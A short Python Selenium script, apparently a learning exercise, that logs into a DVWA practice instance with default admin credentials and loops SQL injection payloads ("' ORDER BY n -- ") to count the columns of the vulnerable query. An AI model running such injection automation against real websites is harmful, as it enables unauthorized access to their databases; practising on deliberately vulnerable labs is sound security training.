from selenium import webdriver 
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from dotenv import load_dotenv
import os

load_dotenv()

IP = os.getenv('IP')
url = f"http://{IP}/dvwa/login.php"

options = Options() 
options.add_argument("-headless")

driver = webdriver.Firefox(options=options)


def number_of_columns():

    driver.find_element(By.XPATH,'/html/body/div/div[2]/div/ul[2]/li[6]/a').click()

    i = 0
    xpath_input = '/html/body/div/div[3]/div/div/form/input[1]'
    xpath_submit = '/html/body/div/div[3]/div/div/form/input[2]'
    xpath_info = '/html/body/div/div[3]/div/h2'

    while True:
        i = i + 1
        sqli = f"' ORDER BY {i} -- "

        try:
            driver.find_element(By.XPATH,xpath_input).send_keys(sqli)
            driver.find_element(By.XPATH,xpath_submit).click()
            driver.find_element(By.XPATH,xpath_info).text

        except:
            print(f"numero de colunas do select --> {i-1}")
            break
        

def login():
    xpaths = ['/html/body/div/form/fieldset/input[1]',
              '/html/body/div/form/fieldset/input[2]',
              '/html/body/div/form/fieldset/p/input']
    
              
    driver.find_element(By.XPATH,xpaths[0]).send_keys("admin")
    driver.find_element(By.XPATH,xpaths[1]).send_keys("admin")
    driver.find_element(By.XPATH,xpaths[2]).click()


try:
    driver.get(url)
    login()
    number_of_columns()

except Exception as e:
    print("Ocorreu um erro ao abrir a URL:", str(e))

driver.quit()
